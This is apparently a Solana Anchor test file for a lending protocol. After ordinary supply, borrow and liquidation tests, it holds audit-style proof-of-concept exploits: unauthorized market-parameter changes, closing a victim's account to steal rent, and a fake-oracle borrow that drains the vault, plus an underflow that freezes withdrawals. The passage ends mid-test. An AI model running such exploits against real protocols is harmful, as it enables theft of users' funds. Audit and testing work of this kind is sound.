import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { MetaLend } from "../target/types/meta_lend";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createMint,
  createAccount,
  mintTo,
  getAccount,
  createTransferInstruction,
} from "@solana/spl-token";
const { expect } = require("chai");

describe("MetaLend Dual-Asset Tests", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.MetaLend as Program<MetaLend>;
  const provider = anchor.getProvider();

  // Test accounts
  let admin: Keypair;
  let user1: Keypair;
  let user2: Keypair;
  let liquidator: Keypair;

  // Token mints and accounts - separate supply and collateral assets
  let usdcMint: PublicKey; // Supply asset (what gets lent/borrowed)
  let ethMint: PublicKey; // Collateral asset (what gets deposited as collateral)

  // User token accounts
  let user1UsdcAccount: PublicKey;
  let user2UsdcAccount: PublicKey;
  let liquidatorUsdcAccount: PublicKey;
  let user1EthAccount: PublicKey;
  let user2EthAccount: PublicKey;
  let liquidatorEthAccount: PublicKey;

  // Program accounts
  let protocolState: PublicKey;
  let market: PublicKey;
  let supplyVault: PublicKey;
  let collateralVault: PublicKey;
  let user1Deposit: PublicKey;
  let user2Deposit: PublicKey;

  // Oracle accounts
  let usdcOracle: PublicKey;
  let ethOracle: PublicKey;

  before(async () => {
    console.log("Setting up dual-asset test environment...");

    // Initialize keypairs
    admin = Keypair.generate();
    user1 = Keypair.generate();
    user2 = Keypair.generate();
    liquidator = Keypair.generate();

    // Airdrop SOL to test accounts
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        admin.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        user1.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        user2.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        liquidator.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );

    // Create supply mint (USDC - what gets borrowed)
    usdcMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      6,
    );

    // Create collateral mint (ETH - what gets deposited as collateral)
    ethMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      9,
    );

    // Create token accounts for supply asset (USDC)
    user1UsdcAccount = await createAccount(
      provider.connection,
      user1,
      usdcMint,
      user1.publicKey,
    );
    user2UsdcAccount = await createAccount(
      provider.connection,
      user2,
      usdcMint,
      user2.publicKey,
    );
    liquidatorUsdcAccount = await createAccount(
      provider.connection,
      liquidator,
      usdcMint,
      liquidator.publicKey,
    );

    // Create token accounts for collateral asset (ETH)
    user1EthAccount = await createAccount(
      provider.connection,
      user1,
      ethMint,
      user1.publicKey,
    );
    user2EthAccount = await createAccount(
      provider.connection,
      user2,
      ethMint,
      user2.publicKey,
    );
    liquidatorEthAccount = await createAccount(
      provider.connection,
      liquidator,
      ethMint,
      liquidator.publicKey,
    );

    // Mint tokens to accounts
    // Supply asset (USDC)
    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      user1UsdcAccount,
      admin,
      1000 * 1e6,
    );
    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      user2UsdcAccount,
      admin,
      500 * 1e6,
    );
    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      liquidatorUsdcAccount,
      admin,
      100 * 1e6,
    );

    // Collateral asset (ETH)
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      user1EthAccount,
      admin,
      10 * 1e9,
    ); // 10 ETH
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      user2EthAccount,
      admin,
      5 * 1e9,
    ); // 5 ETH
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      liquidatorEthAccount,
      admin,
      2 * 1e9,
    ); // 2 ETH

    // Derive PDAs for dual-asset market
    [protocolState] = PublicKey.findProgramAddressSync(
      [Buffer.from("protocol")],
      program.programId,
    );

    [market] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("market"),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    [supplyVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("supply_vault"),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
      ],
      program.programId,
    );

    [collateralVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("collateral_vault"),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    [user1Deposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        user1.publicKey.toBuffer(),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    [user2Deposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        user2.publicKey.toBuffer(),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    // Derive Oracle PDAs
    [usdcOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), usdcMint.toBuffer()],
      program.programId,
    );

    [ethOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), ethMint.toBuffer()],
      program.programId,
    );

    console.log("Dual-asset test environment setup complete!");
    console.log("Supply asset (USDC):", usdcMint.toString());
    console.log("Collateral asset (ETH):", ethMint.toString());
  });

  it("Initialize protocol", async () => {
    console.log("Testing protocol initialization...");

    await program.methods
      .initializeProtocol()
      .accounts({
        protocolState,
        admin: admin.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    const protocolStateAccount = await program.account.protocolState.fetch(
      protocolState,
    );
    expect(protocolStateAccount.admin.toString()).to.equal(
      admin.publicKey.toString(),
    );
    expect(protocolStateAccount.totalMarkets.toNumber()).to.equal(0);
    expect(protocolStateAccount.isPaused).to.equal(false);
    console.log(" Protocol initialized successfully");
  });

  it("Create oracles for both assets", async () => {
    console.log("Testing oracle creation for both assets...");

    const sourceData = Buffer.from("mock_pyth_source_data");

    // Create USDC Oracle (supply asset) - $1 with 6 decimals
    const usdcPrice = new anchor.BN(1_000_000); // $1.00
    await program.methods
      .createOracle(sourceData, usdcPrice, 6)
      .accounts({
        oracle: usdcOracle,
        mint: usdcMint,
        authority: admin.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    // Create ETH Oracle (collateral asset)
    const ethPrice = new anchor.BN(3000_000_000); // $3000.00 with 6 decimals
    await program.methods
      .createOracle(sourceData, ethPrice, 6)
      .accounts({
        oracle: ethOracle,
        mint: ethMint,
        authority: admin.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    const usdcOracleAccount = await program.account.oracle.fetch(usdcOracle);
    const ethOracleAccount = await program.account.oracle.fetch(ethOracle);

    expect(usdcOracleAccount.mint.toString()).to.equal(usdcMint.toString());
    expect(ethOracleAccount.mint.toString()).to.equal(ethMint.toString());

    console.log(" Oracles created successfully");
    console.log("  - USDC: $1.00");
    console.log("  - ETH: $3000.00");
  });

  it("Create dual-asset market", async () => {
    console.log("Testing dual-asset market creation...");

    await program.methods
      .createMarket(
        new anchor.BN(1),
        new anchor.BN(8000), // 80% collateral factor
        new anchor.BN(8500), // 85% liquidation threshold
      )
      .accounts({
        market,
        protocolState,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        supplyOracle: usdcOracle,
        collateralOracle: ethOracle,
        supplyVault,
        collateralVault,
        creator: admin.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    const marketAccount = await program.account.market.fetch(market);
    expect(marketAccount.supplyMint.toString()).to.equal(usdcMint.toString());
    expect(marketAccount.collateralMint.toString()).to.equal(
      ethMint.toString(),
    );
    expect(marketAccount.marketAdmin.toString()).to.equal(
      admin.publicKey.toString(),
    );
    expect(marketAccount.collateralFactor.toNumber()).to.equal(8000);
    expect(marketAccount.isActive).to.equal(true);

    console.log(" Dual-asset market created successfully");
    console.log("  - Supply asset: USDC");
    console.log("  - Collateral asset: ETH");
  });

  it("Initialize user deposit accounts", async () => {
    console.log("Testing user deposit initialization...");

    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: user1Deposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: user1.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user1])
      .rpc();

    const depositAccount = await program.account.userDeposit.fetch(
      user1Deposit,
    );
    expect(depositAccount.user.toString()).to.equal(user1.publicKey.toString());
    expect(depositAccount.supplyDeposited.toNumber()).to.equal(0);
    expect(depositAccount.collateralDeposited.toNumber()).to.equal(0);

    console.log(" User deposit account initialized");
  });

  it("Supply USDC to market", async () => {
    console.log("Testing supply functionality...");

    const supplyAmount = 500 * 1e6; // 500 USDC

    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(supplyAmount))
      .accounts({
        market,
        supplyVault,
        userDeposit: user1Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user1UsdcAccount,
        user: user1.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user1])
      .rpc();

    const depositAccount = await program.account.userDeposit.fetch(
      user1Deposit,
    );
    expect(depositAccount.supplyDeposited.toNumber()).to.equal(supplyAmount);
    expect(depositAccount.ctokenBalance.toNumber()).to.be.greaterThan(0);

    const marketAccount = await program.account.market.fetch(market);
    expect(marketAccount.totalSupplyDeposits.toNumber()).to.equal(supplyAmount);

    console.log(` Supplied ${supplyAmount / 1e6} USDC successfully`);
  });

  it("Borrow USDC against ETH collateral", async () => {
    console.log("Testing borrow functionality with collateral deposit...");

    const collateralAmount = Math.floor(0.1 * 1e9); // 0.1 ETH as collateral
    const borrowAmount = 200 * 1e6; // Borrow 200 USDC (with 0.1 ETH at $3000 = $300, 80% CF = $240 max)

    // Debug the exact values being passed
    console.log("🔍 DEBUG: Exact values being passed to borrow instruction:");
    console.log("Collateral amount (0.1 ETH):", collateralAmount);
    console.log("Borrow amount (200 USDC):", borrowAmount);

    // Manually calculate to identify overflow point
    const ethPrice = 3000_000_000; // $3000 with 6 decimals
    const usdcPrice = 1_000_000; // $1 with 6 decimals
    console.log("ETH price:", ethPrice);
    console.log("USDC price:", usdcPrice);

    // Calculate collateral value: collateralAmount * ethPrice
    console.log(
      "Manual calculation 1: collateral_value = collateralAmount * ethPrice",
    );
    console.log(
      `${collateralAmount} * ${ethPrice} = ${
        BigInt(collateralAmount) * BigInt(ethPrice)
      }`,
    );
    console.log("Max u64:", "18446744073709551615");

    // Calculate max borrow value: collateral_value * 8000 / 10000
    const collateralValue = BigInt(collateralAmount) * BigInt(ethPrice);
    console.log(
      "Manual calculation 2: max_borrow_value = collateral_value * 8000 / 10000",
    );
    console.log(
      `${collateralValue} * 8000 / 10000 = ${
        (collateralValue * BigInt(8000)) / BigInt(10000)
      }`,
    );

    // Calculate new borrow value: borrowAmount * usdcPrice
    console.log(
      "Manual calculation 3: new_borrow_value = borrowAmount * usdcPrice",
    );
    console.log(
      `${borrowAmount} * ${usdcPrice} = ${
        BigInt(borrowAmount) * BigInt(usdcPrice)
      }`,
    );

    console.log(
      "💥 Now attempting borrow instruction that will likely overflow...",
    );

    const user1UsdcBefore = await getAccount(
      provider.connection,
      user1UsdcAccount,
    );
    const user1EthBefore = await getAccount(
      provider.connection,
      user1EthAccount,
    );

    await program.methods
      .borrow(
        new anchor.BN(1),
        new anchor.BN(collateralAmount),
        new anchor.BN(borrowAmount),
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: user1Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user1UsdcAccount,
        userCollateralAccount: user1EthAccount,
        user: user1.publicKey,
        collateralOracle: ethOracle, // Use ETH oracle for collateral
        borrowOracle: usdcOracle, // Use USDC oracle for borrow
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user1])
      .rpc();

    const depositAccount = await program.account.userDeposit.fetch(
      user1Deposit,
    );
    expect(depositAccount.borrowedAmount.toNumber()).to.equal(borrowAmount);
    expect(depositAccount.collateralDeposited.toNumber()).to.equal(
      collateralAmount,
    );

    const user1UsdcAfter = await getAccount(
      provider.connection,
      user1UsdcAccount,
    );
    const user1EthAfter = await getAccount(
      provider.connection,
      user1EthAccount,
    );

    expect(
      Number(user1UsdcAfter.amount) - Number(user1UsdcBefore.amount),
    ).to.equal(borrowAmount);
    expect(
      Number(user1EthBefore.amount) - Number(user1EthAfter.amount),
    ).to.equal(collateralAmount);

    console.log(` Deposited ${collateralAmount / 1e9} ETH collateral`);
    console.log(` Borrowed ${borrowAmount / 1e6} USDC successfully`);
  });

  it("Setup liquidation scenario", async () => {
    console.log("Setting up liquidation scenario...");
    console.log(
      "NOTE: This test demonstrates oracle price manipulation for educational purposes only!",
    );

    // Initialize second user deposit
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: user2Deposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: user2.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user2])
      .rpc();

    // User2 supplies USDC first
    const supplyAmount = 300 * 1e6;
    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(supplyAmount))
      .accounts({
        market,
        supplyVault,
        userDeposit: user2Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user2UsdcAccount,
        user: user2.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user2])
      .rpc();

    // User2 borrows at the edge of liquidation
    // With 0.1 ETH collateral ($300) and 85% liquidation threshold: $300 * 0.85 = $255
    // With 80% collateral factor: $300 * 0.80 = $240 max borrow
    const collateralAmount = Math.floor(0.1 * 1e9); // 0.1 ETH
    const borrowAmount = 200 * 1e6; // Borrow near max allowed

    await program.methods
      .borrow(
        new anchor.BN(1),
        new anchor.BN(collateralAmount),
        new anchor.BN(borrowAmount),
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: user2Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user2UsdcAccount,
        userCollateralAccount: user2EthAccount,
        user: user2.publicKey,
        collateralOracle: ethOracle, // Use ETH oracle for collateral
        borrowOracle: usdcOracle, // Use USDC oracle for borrow
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user2])
      .rpc();

    console.log("Current position:");
    console.log("- Collateral: 0.1 ETH ($300)");
    console.log("- Debt: $200 USDC");
    console.log("- Liquidation threshold: $300 * 85% = $255");
    console.log("- Position is healthy: $200 < $255 ");

    // Manipulate ETH price to trigger liquidation
    console.log(
      "\n🔧 Using TEST-ONLY oracle manipulation to trigger liquidation",
    );
    const lowerEthPrice = new anchor.BN(1800_000_000); // $1800 (down from $3000)
    await program.methods
      .updateOraclePrice(lowerEthPrice)
      .accounts({
        oracle: ethOracle,
        authority: admin.publicKey,
      })
      .signers([admin])
      .rpc();

    console.log("Updated ETH price to $1800");
    console.log("New scenario:");
    console.log("- Collateral: 0.1 ETH ($180)");
    console.log("- Debt: $200 USDC");
    console.log("- Liquidation threshold: $180 * 85% = $153");
    console.log("- Position is NOW LIQUIDATABLE: $200 > $153 💥");

    console.log(" Liquidation scenario setup complete");
  });

  it("Liquidate undercollateralized position", async () => {
    console.log("Testing liquidation functionality...");

    const borrowerDeposit = await program.account.userDeposit.fetch(
      user2Deposit,
    );
    console.log(
      `Borrower position: ${
        borrowerDeposit.borrowedAmount.toNumber() / 1e6
      } USDC debt, ${
        borrowerDeposit.collateralDeposited.toNumber() / 1e9
      } ETH collateral`,
    );

    const liquidationAmount = 50 * 1e6; // Liquidate 50 USDC worth of debt
    const borrowerDepositBefore = await program.account.userDeposit.fetch(
      user2Deposit,
    );

    await program.methods
      .liquidate(new anchor.BN(1), new anchor.BN(liquidationAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        borrowerDeposit: user2Deposit,
        liquidatorSupplyAccount: liquidatorUsdcAccount,
        liquidatorCollateralAccount: liquidatorEthAccount,
        liquidator: liquidator.publicKey,
        oracle: ethOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([liquidator])
      .rpc();

    const borrowerDepositAfter = await program.account.userDeposit.fetch(
      user2Deposit,
    );
    expect(borrowerDepositAfter.borrowedAmount.toNumber()).to.be.lessThan(
      borrowerDepositBefore.borrowedAmount.toNumber(),
    );
    expect(borrowerDepositAfter.collateralDeposited.toNumber()).to.be.lessThan(
      borrowerDepositBefore.collateralDeposited.toNumber(),
    );

    console.log(`✅ Liquidated ${liquidationAmount / 1e6} USDC worth of debt`);
    console.log("✅ Liquidator received ETH collateral with bonus");
  });

  // Report POCs

  it("EXPLOIT: Missing Authority Validation in update_market_params", async () => {
    // 1. Attacker inflates the collateral factor to 100%
    const attacker = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        attacker.publicKey,
        2 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );

    const marketBefore = await program.account.market.fetch(market);
    console.log(
      "Collateral factor before:",
      marketBefore.collateralFactor.toString(),
    ); // 8000

    // Attacker sets collateral_factor to 10000 (100%)
    await program.methods
      .updateMarketParams(new anchor.BN(10000), new anchor.BN(10000))
      .accounts({
        market: market,
        authority: attacker.publicKey, // attacker as authority
      })
      .signers([attacker])
      .rpc();

    const marketAfter = await program.account.market.fetch(market);
    console.log(
      "Collateral factor after:",
      marketAfter.collateralFactor.toString(),
    ); // 10000!

    // 2. Attacker can now borrow 100% of collateral value
    expect(marketAfter.collateralFactor.toNumber()).to.equal(10000);
  });

  it("EXPLOIT: Unauthorized account closure for the `CloseUserDeposit` account", async () => {
    // 1. Create and fund victim and thief accounts
    const victim = Keypair.generate();
    const thief = Keypair.generate();

    await Promise.all([
      provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(
          victim.publicKey,
          2 * anchor.web3.LAMPORTS_PER_SOL,
        ),
      ),
      provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(
          thief.publicKey,
          2 * anchor.web3.LAMPORTS_PER_SOL,
        ),
      ),
    ]);

    const [victimDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        victim.publicKey.toBuffer(),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    // 2. Victim creates their deposit account (zero balances)
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: victimDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: victim.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    const depositInfo = await provider.connection.getAccountInfo(victimDeposit);
    const rentLamports = depositInfo!.lamports;
    console.log(`Target deposit has ${rentLamports} lamports rent`);
    console.log("Victim pubkey:", victim.publicKey.toString());
    console.log("Thief  pubkey:", thief.publicKey.toString());

    const thiefBalanceBefore = await provider.connection.getBalance(
      thief.publicKey,
    );
    // 3. Thief tries to close victim's deposit account
    await program.methods
      .closeUserDeposit()
      .accounts({
        userDeposit: victimDeposit, // victim's account
        user: thief.publicKey, // thief, NOT the victim
      })
      .signers([thief]) // victim never signs, not required!
      .rpc();

    const thiefBalanceAfter = await provider.connection.getBalance(
      thief.publicKey,
    );
    const lamportsStolen = thiefBalanceAfter - thiefBalanceBefore;

    console.log(`Thief gained ${lamportsStolen} lamports`);
    expect(lamportsStolen).to.be.greaterThan(0);

    const closedAccount = await provider.connection.getAccountInfo(
      victimDeposit,
    );
    expect(closedAccount).to.be.null;
    console.log(
      "EXPLOIT SUCCESSFUL: Thief closed victim's account and received rent",
    );
  });

  it("EXPLOIT: Attacker can use arbitrary oracles for borrow/withdraw to trade at lower prices than actual market oracles", async () => {
    const attacker = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        attacker.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );

    // Give attacker some ETH to deposit as collateral
    const attackerEthAccount = await createAccount(
      provider.connection,
      attacker,
      ethMint,
      attacker.publicKey,
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      attackerEthAccount,
      admin,
      1 * 1e9,
    ); // 1 ETH

    // Give attacker a USDC account to receive the stolen funds
    const attackerUsdcAccount = await createAccount(
      provider.connection,
      attacker,
      usdcMint,
      attacker.publicKey,
    );

    const fakeMint = await createMint(
      provider.connection,
      attacker,
      attacker.publicKey,
      attacker.publicKey,
      6,
    );

    // Derive the oracle PDA for the fake mint
    const [fakeOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), fakeMint.toBuffer()],
      program.programId,
    );

    // 3. Create the oracle with price = 100 (minimum valid price)

    await program.methods
      .createOracle(Buffer.from("fake_source"), new anchor.BN(100), 6)
      .accounts({
        oracle: fakeOracle,
        mint: fakeMint,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    console.log("\n[LOG] Fake oracle created with price = 100");

    // Initialize attacker's deposit account
    const [attackerDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        attacker.publicKey.toBuffer(),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: attackerDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    // Borrow 400 USDC with only 0.1 ETH collateral
    //   Correct limit: 0.1 ETH * $3000 × 80% = 240 USDC
    //   With fake borrow oracle (price=100):
    //     max_borrow_value = 100_000_000 × 3_000_000_000 × 8000/10000 = 2.4e17
    //     new_borrow_value = 400_000_000 × 100 = 4e10
    const collateralAmount = 0.1 * 1e9; // 0.1 ETH
    const borrowAmount = 400 * 1e6; // 400 USDC,  more than the 240 USDC limit

    const vaultBefore = await getAccount(provider.connection, supplyVault);

    await program.methods
      .borrow(
        new anchor.BN(1),
        new anchor.BN(collateralAmount),
        new anchor.BN(borrowAmount),
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: attackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: attackerUsdcAccount,
        userCollateralAccount: attackerEthAccount,
        user: attacker.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: fakeOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();

    const attackerBalance = await getAccount(
      provider.connection,
      attackerUsdcAccount,
    );
    const vaultAfter = await getAccount(provider.connection, supplyVault);

    console.log(
      `[LOG] Attacker received:  ${Number(attackerBalance.amount) / 1e6} USDC`,
    );
    console.log(`[LOG] Borrow limit should be 240 USDC`);
    console.log(
      `[LOG] Vault drained by:    ${
        (Number(vaultBefore.amount) - Number(vaultAfter.amount)) / 1e6
      } USDC`,
    );

    expect(Number(attackerBalance.amount)).to.equal(borrowAmount);

    const deposit = await program.account.userDeposit.fetch(attackerDeposit);
    expect(deposit.borrowedAmount.toNumber()).to.equal(borrowAmount);
  });

  it("EXPLOIT: Frozen withdrawals due to broken accounting between deposit and c-tokens", async () => {
    // Setup: fresh depositor to isolate the exact accounting
    const depositor = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        depositor.publicKey,
        10 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );

    const depositorUsdcAccount = await createAccount(
      provider.connection,
      depositor,
      usdcMint,
      depositor.publicKey,
    );
    const depositAmount = 100 * 1e6; // 100 USDC
    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      depositorUsdcAccount,
      admin,
      depositAmount,
    );

    const [depositorDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        depositor.publicKey.toBuffer(),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: depositorDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: depositor.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([depositor])
      .rpc();

    // Supply 100 USDC, this calls update_market_interest (1st interest bump)
    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(depositAmount))
      .accounts({
        market,
        supplyVault,
        userDeposit: depositorDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: depositorUsdcAccount,
        user: depositor.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([depositor])
      .rpc();

    const depositState = await program.account.userDeposit.fetch(
      depositorDeposit,
    );
    const ctokenBalance = depositState.ctokenBalance.toNumber();
    const supplyDeposited = depositState.supplyDeposited.toNumber();

    console.log(`\n[LOG] Deposited: ${depositAmount} raw USDC`);
    console.log(`[LOG] supply_deposited recorded: ${supplyDeposited}`);
    console.log(`[LOG] ctoken_balance: ${ctokenBalance}`);

    // Any subsequent transaction calls update_market_interest again (2nd bump).
    // We trigger this by having another user interact with the market.
    // Simulate additional interest calls by doing a small repay (which calls update_market_interest).
    // Actually we just need ANY instruction, the happy-path tests already ran many txs.
    // Let's do one more to be explicit:
    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(1_000_000)) // 1 USDC from user1 (triggers interest)
      .accounts({
        market,
        supplyVault,
        userDeposit: user1Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user1UsdcAccount,
        user: user1.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user1])
      .rpc();

    // Read current market state to show the divergence
    const marketState = await program.account.market.fetch(market);
    const totalSupply = marketState.totalSupplyDeposits.toNumber();
    const totalCtokens = marketState.totalCtokenSupply.toNumber();
    const SCALING = 1_000_000_000;
    const exchangeRate = Math.floor((totalSupply * SCALING) / totalCtokens);
    const tokensToWithdraw = Math.floor(
      (ctokenBalance * exchangeRate) / SCALING,
    );

    console.log(
      `[LOG] market.total_supply_deposits (after interest): ${totalSupply}`,
    );
    console.log(
      `[LOG] exchange_rate now:            ${exchangeRate / SCALING}`,
    );
    console.log(
      `[LOG] tokens_to_withdraw for all ctokens: ${tokensToWithdraw}`,
    );
    console.log(`[LOG] supply_deposited (unchanged): ${supplyDeposited}`);
    console.log(
      `[LOG] Underflow by:                 ${
        tokensToWithdraw - supplyDeposited
      }`,
    );

    expect(tokensToWithdraw).to.be.greaterThan(
      supplyDeposited,
      "tokens_to_withdraw must exceed supply_deposited to trigger the underflow",
    );

    // Now attempt to withdraw all cTokens, this MUST panic
    let withdrawError: Error | null = null;
    try {
      await program.methods
        .withdraw(new anchor.BN(1), new anchor.BN(ctokenBalance))
        .accounts({
          market,
          supplyVault,
          userDeposit: depositorDeposit,
          supplyMint: usdcMint,
          collateralMint: ethMint,
          userSupplyAccount: depositorUsdcAccount,
          user: depositor.publicKey,
          supplyOracle: usdcOracle,
          collateralOracle: ethOracle,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([depositor])
        .rpc();

      console.log(
        "[LOG] Withdraw unexpectedly succeeded, exchange rate may not have grown enough.",
      );
    } catch (e: any) {
      withdrawError = e;
      const isMathOverflow = e.message?.includes("MathOverflow");
      console.log(`[LOG] Withdraw panicked: ${e.message?.substring(0, 100)}`);
      expect(isMathOverflow).to.be.true;
    }

    expect(withdrawError).to.not.be.null;
    expect(withdrawError!.message).to.include("MathOverflow");

    // Verify the depositor's tokens are now permanently frozen
    const finalState = await program.account.userDeposit.fetch(
      depositorDeposit,
    );
    expect(finalState.ctokenBalance.toNumber()).to.equal(
      ctokenBalance,
      "ctoken_balance unchanged, depositor cannot withdraw their own funds",
    );

    const finalWalletBalance = await getAccount(
      provider.connection,
      depositorUsdcAccount,
    );
    expect(Number(finalWalletBalance.amount)).to.equal(
      0,
      "Depositor's wallet is empty, funds permanently trapped in vault",
    );

    console.log("\n[LOG] *** EXPLOIT CONFIRMED ***");
    console.log(
      "[LOG] Depositor's 100 USDC is permanently frozen in the vault.",
    );
  });

  it("EXPLOIT: Interest rate inflation due to incorrect slots_per_year used for interest calculation causes protocol to charge 197.2% interest instead of 2%", async () => {
    // ── Setup: isolated keypair ──────────────────────────────────────────────
    const interestUser = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        interestUser.publicKey,
        5 * anchor.web3.LAMPORTS_PER_SOL,
      ),
    );

    const iuUsdcAccount = await createAccount(
      provider.connection,
      interestUser,
      usdcMint,
      interestUser.publicKey,
    );
    const iuEthAccount = await createAccount(
      provider.connection,
      interestUser,
      ethMint,
      interestUser.publicKey,
    );

    // Mint 1 ETH collateral
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      iuEthAccount,
      admin,
      1 * 1e9,
    );

    const [iuDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        interestUser.publicKey.toBuffer(),
